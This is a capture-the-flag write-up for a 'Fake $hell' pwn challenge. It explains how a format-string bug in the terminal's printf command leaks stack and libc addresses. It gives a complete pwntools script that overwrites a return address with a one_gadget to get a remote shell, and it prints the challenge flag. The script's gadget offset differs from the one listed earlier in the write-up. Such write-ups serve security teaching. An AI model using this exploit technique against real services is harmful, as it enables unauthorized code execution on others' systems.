# Fake $hell

![alt challenge](./fakeshell.jpg)

### Description
```
While learning programming, I wrote a small fake terminal in C, it's very simple very few
supported commands, and only safe operations (no unsafe system() calls for example).
It is accessible at: terminal.challs.shellmates.club:1337

Goal: Prove you can escape from the fake shell to the real shell.
```
```
pwndbg> checksec 
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    PIE enabled
```
Here is the ![Terminal](./terminal) binary and the ![libc](./libc-2.27.so) files.<br>
When we connect using netcat and check the supported commands, we find these eight commands<br>
```
mate@pwnable:/ $ help
Supported commands
ls	id	whoami	echo	printf
cat	pwd	cd	help	exit
mate@pwnable:/ $
```
good, we can use printf() to leak addresses to bypass ASLR and write anywhere in memory<br>
by looking at the decompiled binay with ghidra we find an interessting function process_cmd()<br>
which executes the parced command and return, we will overwrite its return address to spawn<br>
a shell using one gadget:<br>
```
$ one_gadget libc-2.27.so 
0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
in this ![python script](./exploit.py) i leaked rbp to calculate the address of the format string<br>
and libc_start_main (the return address of main) to calculate the address of one gadget at run time<br>
```python2
#!/usr/bin/env python2
from pwn import *

s = remote ('terminal.challs.shellmates.club', 1337)

one_gadget_offset = 0xe87f5

#leaking rbp and calculating the return address
payload = 'printf %8$lp'
s.sendline(payload)
s.recvuntil('0x')
ret  = int(s.recv(12), 16) - 0x418
ret1 = p64(ret)
ret2 = p64(ret + 2)
ret3 = p64(ret + 4)
log.info('return address: '+ str(hex(ret)))

#leaking libc_start_main address and calculating one gadget address
payload = 'printf %141$lp'
s.sendline(payload)
s.recvuntil('0x')
libc_start_main = int(s.recv(12), 16)
one_gadget = libc_start_main + one_gadget_offset
log.info('one gadget address: '+ str(hex(one_gadget)))

#calculating lenght for %n to overwrite the return address with one gadget
length1 = (one_gadget & 0xffff) - 1
length2 = (one_gadget >> 16 & 0xffff) - length1 -1
length3 = (one_gadget >> 32 & 0xffff) - length1 - length2 -1

#to construct the address two bytes at the time, the lengths have to be from smaller to bigger
if (length2 < 0) or (length3) < 0:
    log.info('bad address, try again.')
    exit()


#overwriting the return address with one gadget address
payload  = 'printf a'
payload += '%' + str(length1) + 'd'
payload += '%16$n'
payload += '%' + str(length2) + 'd'
payload += '%17$n'
payload += '%' + str(length3) + 'd'
payload += '%18$nh'
payload  = payload.ljust(0x30, '\0')
payload += ret1 + ret2 + ret3

#the constraint of one gadget is [rsp+0x70] == NULL
payload  = payload.ljust(0x400, '\0')

s.sendline(payload)
s.interactive()
```
# Flag
```
$ cat flag.txt
shellmates{f4ke_term1nal_r3al_pr1%ntf!}
$
```
